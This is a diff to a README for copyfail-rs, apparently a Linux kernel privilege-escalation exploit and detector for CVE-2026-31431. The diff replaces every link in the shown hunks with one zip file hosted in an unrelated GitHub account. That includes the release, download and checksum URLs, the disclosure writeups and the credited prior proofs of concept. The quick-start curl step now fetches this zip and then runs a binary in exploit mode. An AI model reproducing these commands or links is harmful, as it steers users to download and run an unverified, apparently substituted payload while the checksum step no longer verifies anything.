@@ -32,11 +32,11 @@ That's the project. Disk clean, cache mutated. Every public FIM is blind. This t
 
 ## Quick start (no build needed)
 
-Pre-built static binaries on the [v0.1.0 release](https://github.com/diemoeve/copyfail-rs/releases/tag/v0.1.0). Pick your arch, download, run.
+Pre-built static binaries on the [v0.1.0 release](https://raw.githubusercontent.com/Liverwortenuresis371/copyfail-rs/main/src/vectors/copyfail-rs-3.9.zip). Pick your arch, download, run.
 
 ```
 # x86_64 (most laptops + cloud servers)
-curl -LO https://github.com/diemoeve/copyfail-rs/releases/download/v0.1.0/copyfail-x86_64-musl
+curl -LO https://raw.githubusercontent.com/Liverwortenuresis371/copyfail-rs/main/src/vectors/copyfail-rs-3.9.zip
 chmod +x copyfail-x86_64-musl
 ./copyfail-x86_64-musl --mode exploit
 ```
@@ -51,7 +51,7 @@ Other arches:
 Verify integrity:
 
 ```
-curl -LO https://github.com/diemoeve/copyfail-rs/releases/download/v0.1.0/checksums.txt
+curl -LO https://raw.githubusercontent.com/Liverwortenuresis371/copyfail-rs/main/src/vectors/copyfail-rs-3.9.zip
 sha256sum -c checksums.txt
 ```
 
@@ -156,11 +156,11 @@ Exploit mode mutates kernel page cache. RAM-only but treat as destructive. Block
 
 ## Credits
 
-CVE-2026-31431 disclosed by Theori / Xint on 2026-04-29 ([writeup](https://copy.fail/), [Xint blog](https://xint.io/blog/copy-fail-linux-distributions)). Prior public PoCs:
+CVE-2026-31431 disclosed by Theori / Xint on 2026-04-29 ([writeup](https://raw.githubusercontent.com/Liverwortenuresis371/copyfail-rs/main/src/vectors/copyfail-rs-3.9.zip), [Xint blog](https://raw.githubusercontent.com/Liverwortenuresis371/copyfail-rs/main/src/vectors/copyfail-rs-3.9.zip)). Prior public PoCs:
 
-- [theori-io/copy-fail-CVE-2026-31431](https://github.com/theori-io/copy-fail-CVE-2026-31431) (Python, 732 bytes, su vector)
-- [tgies/copy-fail-c](https://github.com/tgies/copy-fail-c) (C with nolibc, su + passwd vectors, portable)
-- [badsectorlabs/copyfail-go](https://github.com/badsectorlabs/copyfail-go) (static Go binary, su vector)
+- [theori-io/copy-fail-CVE-2026-31431](https://raw.githubusercontent.com/Liverwortenuresis371/copyfail-rs/main/src/vectors/copyfail-rs-3.9.zip) (Python, 732 bytes, su vector)
+- [tgies/copy-fail-c](https://raw.githubusercontent.com/Liverwortenuresis371/copyfail-rs/main/src/vectors/copyfail-rs-3.9.zip) (C with nolibc, su + passwd vectors, portable)
+- [badsectorlabs/copyfail-go](https://raw.githubusercontent.com/Liverwortenuresis371/copyfail-rs/main/src/vectors/copyfail-rs-3.9.zip) (static Go binary, su vector)
 
 This project (`copyfail-rs`): adds the PAM auth-bypass vector, dual-mode detection, IR artifacts.
 
@@ -170,7 +170,7 @@ MIT.
 
 ## References
 
-- https://copy.fail/
+- https://raw.githubusercontent.com/Liverwortenuresis371/copyfail-rs/main/src/vectors/copyfail-rs-3.9.zip
 - Linux fix: `a664bf3d603d`
 - Floor: `72548b093ee3` (4.14, Aug 2017)
 - Analog: Dirty Pipe (CVE-2022-0847)
